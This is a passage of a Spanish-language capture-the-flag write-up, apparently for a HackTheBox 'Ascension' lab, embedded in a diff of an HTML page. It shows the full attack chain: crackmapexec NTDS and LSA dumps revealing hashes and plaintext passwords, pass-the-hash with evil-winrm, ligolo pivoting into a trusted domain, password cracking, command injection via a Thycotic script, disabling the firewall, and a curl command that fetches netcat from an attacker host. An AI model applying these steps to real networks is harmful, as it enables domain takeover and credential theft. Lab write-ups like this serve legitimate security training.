+</span><span class="az">È Remember that you should search more info inside the other drives</span><span class="p">
+    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 10 GB)(</span><span class="ro">Permissions: Users [AppendData/CreateDirectories]</span><span class="p">)
+    E:\ (Type: Fixed)(Volume label: Backups)(Filesystem: NTFS)(Available space: 4 GB)(</span><span class="ro">Permissions: Users [AppendData/CreateDirectories]</span><span class="p">)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Cambiamos a la unidad <code class="language-plaintext highlighter-rouge">E:</code> donde despues de navegar entre directorios vemos un archivo <code class="language-plaintext highlighter-rouge">Users.txt</code> que nos muestra credenciales para el usuario <code class="language-plaintext highlighter-rouge">Administrator</code></p><p>
+</p><div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\svc_backup.DAEDALUS\Documents&gt; </span><span class="am">E:</span><span class="p">
+PS E:\&gt; </span><span class="am">dir</span><span class="p">
+
+    Directory: E:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/13/2020   3:54 PM                Annual IT Compliance Report - Export  
+
+PS E:\&gt; </span><span class="am">cd</span><span class="az"> 'Annual IT Compliance Report - Export'</span><span class="p">
+PS E:\Annual IT Compliance Report - Export&gt; </span><span class="am">dir</span><span class="p">
+
+    Directory: E:\Annual IT Compliance Report - Export
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/10/2020   6:04 AM           4852 Builtin.txt
+-a----       10/10/2020   6:04 AM            530 Daedalus.txt
+-a----       10/10/2020   6:05 AM           2541 Users.txt
+
+PS E:\Annual IT Compliance Report - Export&gt; </span><span class="am">type </span><span class="p">Users.txt
+Name	Type	Description
+Administrator	User	DSRM Password: kF4df76fj*JfAcf73j
+.........................................................
+PS E:\Annual IT Compliance Report - Export&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esta contraseña es valida para el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> en el <code class="language-plaintext highlighter-rouge">DC1</code> autenticandose localmente, pero al ser DC podemos dumpear el <code class="language-plaintext highlighter-rouge">ntds</code> y ver todos los hashes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb dc1.daedalus.local -u Administrator -p </span><span class="am">'kF4df76fj*JfAcf73j' </span><span class="p">--local-auth
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:DC1) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="ve">[+] </span><span class="p">DC1\Administrator:kF4df76fj*JfAcf73j </span><span class="am">(Pwn3d!)
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb dc1.daedalus.local -u Administrator -p </span><span class="am">'kF4df76fj*JfAcf73j' </span><span class="p">--local-auth --ntds drsuapi
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:DC1) (signing:True) (SMBv1:False)
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="ve">[+] </span><span class="p">DC1\Administrator:kF4df76fj*JfAcf73j </span><span class="am">(Pwn3d!)</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a3ff633d308be8e06dbb4e2e88783533:::
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3e1e73de1f69e094386b8496fdbdaa90:::
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">daedalus.local\elliot:1112:aad3b435b51404eeaad3b435b51404ee:74fdf381a94e1e446aaedf1757419dcd:::
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">daedalus.local\svc_backup:1602:aad3b435b51404eeaad3b435b51404ee:f913cd9d773be0d48389d45a20b6364a:::
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">daedalus.local\billing_user:1603:aad3b435b51404eeaad3b435b51404ee:65043c86ce4386582442450feed8ce53:::  
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">DC1$:1000:aad3b435b51404eeaad3b435b51404ee:c5a43d3b4bb5b1e5aa0c0fd1fc33a8fb:::
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">WEB01$:1109:aad3b435b51404eeaad3b435b51404ee:cea841ef31ca13817f6d6c73b3c26b1a:::
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">MEGAAIRLINE$:1108:aad3b435b51404eeaad3b435b51404ee:f68f00c91f2b98c63593309aa61ae76d:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con este hash podriamos simplemente conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> al equipo DC1</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ evil-winrm </span><span class="p">-i dc1.daedalus.local -u Administrator -H a3ff633d308be8e06dbb4e2e88783533  
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">whoami</span><span class="p">
+daedalus\administrator
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">type </span><span class="p">..\Desktop\flag.txt
+ASCENSION{0G_adm1ni5tR@tor}
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque si dumpeamos los secretos <code class="language-plaintext highlighter-rouge">lsa</code> encontramos una contraseña en texto plano para <code class="language-plaintext highlighter-rouge">Administrator</code>, tambien es valida pero en este caso a nivel de <code class="language-plaintext highlighter-rouge">dominio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb dc1.daedalus.local -u Administrator -p </span><span class="am">'kF4df76fj*JfAcf73j' </span><span class="p">--local-auth --lsa
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:DC1) (signing:True) (SMBv1:False)
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="ve">[+] </span><span class="p">DC1\Administrator:kF4df76fj*JfAcf73j </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="ve">[+] </span><span class="p">Dumping LSA secrets
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">MEGAAIRLINE.LOCAL/Administrator:$DCC2$10240#Administrator#3ea6e70c7142de7e521195f33086a2bf: (2020-10-13 12:53:58)
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">DAEDALUS\DC1$:aes256-cts-hmac-sha1-96:5c286354381f92663fa48d68aacb74ad4439ef2bdb189a7891f587fa4ec78503
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">DAEDALUS\DC1$:aes128-cts-hmac-sha1-96:a210ba502053511074c76665ca98addf
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">DAEDALUS\DC1$:des-cbc-md5:3b7a6be3e092bcae
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">DAEDALUS\DC1$:plain_password_hex:80ee1497c9f6cc7d6116bdd95938572bbab0d4bdf022ba201d1e4dbab1d7ead524c8eff4bc4a864c7569f6dff30c89914d9f83e47840a8e7705bb9c2dc0b8be208e88e5a846e94f70310c249bac1cef10803a83bd9bab790a6d02146918775ff6bff9d8c082378c0f783d4a9a29fb3eb81775f8eac2e0f62075503f39209ea18634b7a58e180e43cfe49cbc46801ed9a3a57a9033940a8867be1febd9dc9340abcab572f3999a0f279538b964ed3e16aa32e2d5567089a6835be29297f44171204163280c96755b5889278b2bd21a7da8c289462368bb1357d2f9ef0d64a16d23c5307464ba912c36be823632adb11e4  
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">DAEDALUS\DC1$:aad3b435b51404eeaad3b435b51404ee:c5a43d3b4bb5b1e5aa0c0fd1fc33a8fb:::
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">DAEDALUS\administrator:pleasefastenyourseatbelts01!
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">dpapi_machinekey:0xee3ee8172d485d91d928e75a6199a2d9d1552d2a
+</span><span class="am">dpapi_userkey:0x872350e7691cd1f10c04962e21f42f7921a64796
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="am">NL$KM:4d9aaba35a7a2f5025fc831a10fe1ea5d3b99da8b54eeb602bd678537b732ae044a8770c4836372680d02c90d416aae566534b7fa92d50998a260a20400d9be1</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con esta contraseña tambien podriamos conectarnos al <code class="language-plaintext highlighter-rouge">DC1</code> usando <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ evil-winrm </span><span class="p">-i dc1.daedalus.local -u Administrator -p pleasefastenyourseatbelts01!  
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">whoami</span><span class="p">
+daedalus\administrator
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">type </span><span class="p">..\Desktop\flag.txt
+ASCENSION{0G_adm1ni5tR@tor}
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag5">
+<br><h3 class="post-title">Corridor</h3>
+<h4 class="post-title">ASCENSION{n0t_so_s3cR3t_H1sToRy}</h4><br>
+
+<p class="plain-text">Ya como administradores del dominio en el equipo <code class="language-plaintext highlighter-rouge">DC1</code> ademas de la interfaz del dominio nos encontramos con otra interfaz de red que es la <code class="language-plaintext highlighter-rouge">192.168.11.0/24</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\Administrator\Documents&gt; </span><span class="am">ipconfig</span><span class="p">
+
+Windows IP Configuration
+
+Ethernet adapter Ethernet1 2:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::7d64:b14e:3dce:3e00%14  
+   IPv4 Address. . . . . . . . . . . : 192.168.11.6
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . :
+
+Ethernet adapter Ethernet0 5:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::2cb9:1377:b95:2754%7
+   IPv4 Address. . . . . . . . . . . : 192.168.10.6
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . :
+
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Enumerando un poco logramos encontrar la razon, y es que ademas del <code class="language-plaintext highlighter-rouge">dominio</code> <code class="language-plaintext highlighter-rouge">daedalus.local</code> comprometido existe otro que se nombra <code class="language-plaintext highlighter-rouge">megaairline.local</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\Administrator\Documents&gt; </span><span class="am">Import-Module </span><span class="p">.\PowerView.ps1  
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">Invoke-MapDomainTrust</span><span class="p">
+
+SourceName      : daedalus.local
+TargetName      : megaairline.local
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+WhenCreated     : 10/10/2020 5:48:47 PM
+WhenChanged     : 9/1/2023 2:59:58 AM
+
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tenemos un problema y es que desde nuestra sesion de <code class="language-plaintext highlighter-rouge">ligolo</code> que tenemos en <code class="language-plaintext highlighter-rouge">WEB01</code> no tienemos acceso a la <code class="language-plaintext highlighter-rouge">.11.0/24</code> y desde el equipo <code class="language-plaintext highlighter-rouge">DC1</code> no tenemos conexion directa hacia nuestro equipo, iniciaremos redirigiendo en ligolo desde <code class="language-plaintext highlighter-rouge">WEB01</code> todo lo que llegue por el puerto <code class="language-plaintext highlighter-rouge">8888</code> por la <code class="language-plaintext highlighter-rouge">.10.39</code> a nuestro equipo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="am">[Agent : WEB01\svc_dev@WEB01] » </span><span class="p">listener_add --addr 192.168.10.39:8888 --to 10.10.14.10:8888  
+</span><span class="az">INFO</span><span class="p">[0173] Listener created on remote agent! 
+</span><span class="am">[Agent : WEB01\svc_dev@WEB01] »</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues simplemente enviamos la conexion desde <code class="language-plaintext highlighter-rouge">DC1</code> a <code class="language-plaintext highlighter-rouge">WEB01</code> por el puerto 8888</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\Administrator\Documents&gt; </span><span class="am">.\agent.exe </span><span class="c1">-connect </span><span class="p">192.168.10.39:8888 </span><span class="c1">-ignore-cert  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente recibimos una <code class="language-plaintext highlighter-rouge">sesion</code> que recibimos en <code class="language-plaintext highlighter-rouge">ligolo</code> y procedemos a iniciarla</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="am">Agent : WEB01\svc_dev@WEB01] » 
+</span><span class="az">INFO</span><span class="p">[0179] Agent joined.           </span><span class="az">name</span><span class="p">="DAEDALUS\\Administrator@DC1" </span><span class="az">remote</span><span class="p">="10.10.14.10:47204"  
+</span><span class="am">[Agent : WEB01\svc_dev@WEB01] » </span><span class="p">session
+</span><span class="ve">? </span><span class="p">Specify a session : </span><span class="az">2 - DAEDALUS\Administrator@DC1 - 10.10.14.10:47204
+</span><span class="am">[Agent : DAEDALUS\Administrator@DC1] » </span><span class="p">start
+</span><span class="az">INFO</span><span class="p">[0190] Starting tunnel to DAEDALUS\Administrator@DC1 
+</span><span class="am">[Agent : DAEDALUS\Administrator@DC1] »</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Agregamos el segmento <code class="language-plaintext highlighter-rouge">192.168.10.0/24</code> a la interfaz de <code class="language-plaintext highlighter-rouge">ligolo</code> y ahora tenemos conexión con todos los equipos de la red, podemos comprobarlo con un ping</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sudo ip </span><span class="p">route add 192.168.11.0/24 dev ligolo
+
+</span><span class="ve">❯ ping </span><span class="p">-c1 -w1 192.168.11.6
+PING 192.168.11.6 (192.168.11.6) 56(84) bytes of data.
+64 bytes from 192.168.11.6: icmp_seq=1 ttl=64 time=162 ms
+
+--- 192.168.11.6 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms  
+rtt min/avg/max/mdev = 161.931/161.931/161.931/0.000 ms</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Escaneando los hosts de este segmento, ademas del propio <code class="language-plaintext highlighter-rouge">DC1</code> podemos ver otros 2 equipos que son <code class="language-plaintext highlighter-rouge">MS01</code> y <code class="language-plaintext highlighter-rouge">DC2</code> pertenecientes al dominio <code class="language-plaintext highlighter-rouge">megaairline.local</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb 192.168.11.0/24
+</span><span class="az">SMB         </span><span class="p">192.168.11.6    445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)
+</span><span class="az">SMB         </span><span class="p">192.168.11.201  445    DC2              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC2) (domain:megaairline.local) (signing:True) (SMBv1:False)
+</span><span class="az">SMB         </span><span class="p">192.168.11.210  445    MS01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:MS01) (domain:megaairline.local) (signing:False) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Por comodidad y posibles proximos ataques agregaremos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> las direcciones con su <code class="language-plaintext highlighter-rouge">dominio</code> que sera el <code class="language-plaintext highlighter-rouge">hostname</code> y el dominio <code class="language-plaintext highlighter-rouge">megaairline.local</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ echo </span><span class="am">"192.168.11.210 ms01.megaairline.local" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts
+
+</span><span class="ve">❯ echo </span><span class="am">"192.168.11.201 megaairline.local dc2.megaairline.local" </span><span class="p">| </span><span class="ve">sudo tee </span><span class="p">-a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para saber por donde iniciar escanearemos los hosts de esta red con <code class="language-plaintext highlighter-rouge">nmap</code>, en el equipo <code class="language-plaintext highlighter-rouge">MS01</code> podemos ver el puerto <code class="language-plaintext highlighter-rouge">80</code> abierto que indica un posible servicio web</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ nmap </span><span class="p">ms01.megaairline.local -Pn
+Nmap scan report for ms01.megaairline.local (192.168.11.210)  
+PORT     STATE SERVICE
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+443/tcp  open  https
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+</span><span class="ve">❯ nmap </span><span class="p">dc2.megaairline.local -Pn
+Nmap scan report for dc2.megaairline.local (192.168.11.201)  
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al entrar a la web simplemente nos encontramos con la pagina por defecto de <code class="language-plaintext highlighter-rouge">IIS</code></p>
+<a href="/endgames/ascension/23.png" target="_blank"><div><p><img src="/endgames/ascension/23.png"></p></div></a>
+
+<p class="plain-text">Ayudandonos de <code class="language-plaintext highlighter-rouge">wfuzz</code> podemos aplicar fuerza bruta para descubrir directorios en la web a traves de un diccionario, al hacerlo encontramos el directorio <code class="language-plaintext highlighter-rouge">/secretserver</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://ms01.megaairline.local/FUZZ --hc 404 -t 100  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://ms01.megaairline.local/FUZZ
+Total requests: 1185254
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000651052:   </span><span class="az">302        </span><span class="p">3 L      8 W        167 Ch      "secretserver"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Este directorio solo tiene un login de <code class="language-plaintext highlighter-rouge">thycotic</code> donde necesitaremos credenciales</p>
+<a href="/endgames/ascension/4.png" target="_blank"><div><p><img src="/endgames/ascension/4.png"></p></div></a>
+
+<p class="plain-text">Cuando dumpeamos el <code class="language-plaintext highlighter-rouge">ntds</code> de DC1 podiamos ver el hash NT del usuario <code class="language-plaintext highlighter-rouge">elliot</code> que no ocupamos, si lo pasamos a <code class="language-plaintext highlighter-rouge">john</code> logramos crackearlo y obtener la contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --format=NT  
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 128/128 XOP 4x2])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">84@m!n@9         </span><span class="p">(</span><span class="am">?</span><span class="p">)
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Curiosamente estas credenciales tambien son validas por smb para el nuevo <code class="language-plaintext highlighter-rouge">dominio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb dc2.megaairline.local -u elliot -p </span><span class="am">'84@m!n@9'
+</span><span class="az">SMB         </span><span class="p">megaairline.local 445    DC2              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC2) (domain:megaairline.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">megaairline.local 445    DC2              </span><span class="ve">[+] </span><span class="p">megaairline.local\elliot:84@m!n@9</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Las credenciales obtenidas tambien podemos usarlas para el login de <code class="language-plaintext highlighter-rouge">thycotic</code> autenticandonos como el usuario <code class="language-plaintext highlighter-rouge">elliot</code>, de esta manera obtenemos acceso</p>
+<a href="/endgames/ascension/5.png" target="_blank"><div><p><img src="/endgames/ascension/5.png"></p></div></a>
+<a href="/endgames/ascension/6.png" target="_blank"><div><p><img src="/endgames/ascension/6.png"></p></div></a>
+
+<p class="plain-text">Si vamos a <code class="language-plaintext highlighter-rouge">Admin &gt; Scripts</code> podemos ver varios existentes en el apartado <code class="language-plaintext highlighter-rouge">SSH</code></p>
+<a href="/endgames/ascension/7.png" target="_blank"><div><p><img src="/endgames/ascension/7.png"></p></div></a>
+
+<p class="plain-text">Al intentar ejecutarlo nos pedira unos datos, podemos seleccionar <code class="language-plaintext highlighter-rouge">127.0.0.1</code> como servidor y como credenciales las de <code class="language-plaintext highlighter-rouge">elliot</code> a nivel de dominio, parece se conectara a <code class="language-plaintext highlighter-rouge">ssh</code> ademas nos pide un <code class="language-plaintext highlighter-rouge">argumento</code> pero por ahora lo dejaremos en blanco</p>
+<a href="/endgames/ascension/8.png" target="_blank"><div><p><img src="/endgames/ascension/8.png"></p></div></a>
+
+<p class="plain-text">Enviamos y en el resultado podemos ver un error de un comando ejecutado en la <code class="language-plaintext highlighter-rouge">consola</code>, por lo que es probable que se conecte a <code class="language-plaintext highlighter-rouge">ssh</code> internamente y lo ejecute</p>
+<a href="/endgames/ascension/9.png" target="_blank"><div><p><img src="/endgames/ascension/9.png"></p></div></a>
+
+<p class="plain-text">Podemos dejar como argumento un simple <code class="language-plaintext highlighter-rouge">whoami</code> y en la respuesta podemos ver el output ejecutado como el usuario <code class="language-plaintext highlighter-rouge">elliot</code>, asi que podemos ejecutar comandos</p>
+<a href="/endgames/ascension/10.png" target="_blank"><div><p><img src="/endgames/ascension/10.png"></p></div></a>
+<a href="/endgames/ascension/11.png" target="_blank"><div><p><img src="/endgames/ascension/11.png"></p></div></a>
+
+<p class="plain-text">Finalmente cambiamos el comando y podemos leer la <code class="language-plaintext highlighter-rouge">flag</code> en el escritorio de este</p>
+<a href="/endgames/ascension/12.png" target="_blank"><div><p><img src="/endgames/ascension/12.png"></p></div></a>
+<a href="/endgames/ascension/13.png" target="_blank"><div><p><img src="/endgames/ascension/13.png"></p></div></a>
+
+</section>
+
+<section class="post" id="flag6">
+<br><h3 class="post-title">Upgrade</h3>
+<h4 class="post-title">ASCENSION{sL4ck1ng_0n_enCrypt1oN}</h4><br>
+
+<p class="plain-text">Recordemos que no tenemos conexion directa, para facilitar algunas cosas usaremos el <code class="language-plaintext highlighter-rouge">DC1</code>, pero antes habilitaremos <code class="language-plaintext highlighter-rouge">RDP</code> y nos conectamos usando <code class="language-plaintext highlighter-rouge">xfreerdp</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb dc1.daedalus.local -u Administrator -p pleasefastenyourseatbelts01! -M rdp -o ACTION=enable
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="ve">[+] </span><span class="p">daedalus.local\Administrator:pleasefastenyourseatbelts01! </span><span class="am">(Pwn3d!)
+</span><span class="az">RDP         </span><span class="p">daedalus.local  445    DC1              </span><span class="ve">[+] </span><span class="p">RDP enabled successfully
+
+</span><span class="ve">❯ xfreerdp </span><span class="p">/u:Administrator /p:pleasefastenyourseatbelts01! /v:dc1.daedalus.local /dynamic-resolution /cert:ignore</span>
+</code></pre></div></div><br>
+
+<a href="/endgames/ascension/16.png" target="_blank"><div><p><img src="/endgames/ascension/16.png"></p></div></a>
+
+<p class="plain-text">Para montar un servidor http en el <code class="language-plaintext highlighter-rouge">DC1</code> que tiene conexion directa con el otro dominio primero subiremos un msi de <a href="https://www.python.org/downloads/release/python-340/">python</a> y lo instalaremos para poder usarlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\Administrator\Documents&gt; </span><span class="am">upload </span><span class="p">python-3.4.4.amd64.msi
+</span><span class="az">
+Info: Uploading python-3.4.4.amd64.msi to C:\Users\Administrator\Documents\python-3.4.4.amd64.msi  
+</span><span class="sa">
+Data: 34739540 bytes of 34739540 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya instalado podemos usar <code class="language-plaintext highlighter-rouge">python</code> para crear un servidor http en <code class="language-plaintext highlighter-rouge">Documents</code> donde subiremos todo lo que querramos compartir en un servidor <code class="language-plaintext highlighter-rouge">http</code> desde el DC1</p>
+<a href="/endgames/ascension/15.png" target="_blank"><div><p><img src="/endgames/ascension/15.png"></p></div></a>
+
+<p class="plain-text">Tenemos otra limitacion y es el <code class="language-plaintext highlighter-rouge">firewall</code> pero podemos deshabilitarlo facilmente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\Administrator\Documents&gt; </span><span class="am">Set-NetFirewallProfile </span><span class="c1">-Profile </span><span class="p">Domain,Public,Private </span><span class="c1">-Enabled </span><span class="p">False  
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora subiremos el <code class="language-plaintext highlighter-rouge">netcat.exe</code> para que se comparta con el servidor <code class="language-plaintext highlighter-rouge">http</code> creado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\Administrator\Documents&gt; </span><span class="am">upload </span><span class="p">netcat.exe
+</span><span class="az">
+Info: Uploading netcat.exe to C:\Users\Administrator\Documents\netcat.exe  
+</span><span class="sa">
+Data: 58260 bytes of 58260 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como comando ejecutado como <code class="language-plaintext highlighter-rouge">elliot</code> enviaremos una peticion con <code class="language-plaintext highlighter-rouge">curl</code> al <code class="language-plaintext highlighter-rouge">netcat.exe</code> compartido en el <code class="language-plaintext highlighter-rouge">DC1</code> y lo guardaremos en directorio <code class="language-plaintext highlighter-rouge">C:\ProgramData</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">curl 192.168.11.6/netcat.exe -o C:\ProgramData\netcat.exe  </span>
+</code></pre></div></div><br>
+<a href="/endgames/ascension/17.png" target="_blank"><div><p><img src="/endgames/ascension/17.png"></p></div></a>
+
+<p class="plain-text">Al hacerlo recibimos una peticion en el servidor <code class="language-plaintext highlighter-rouge">http</code> montado, significa que el compilado de <code class="language-plaintext highlighter-rouge">netcat.exe</code> se ha guardado en la maquina victima correctamente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\Administrator\Documents&gt; </span><span class="am">python</span><span class="c1"> -m </span><span class="p">http.server 80  
+Serving HTTP on 0.0.0.0 port 80 ...
+192.168.11.210 - - "GET /netcat.exe HTTP/1.1" 200 -</span>
+</code></pre></div></div><br>
+
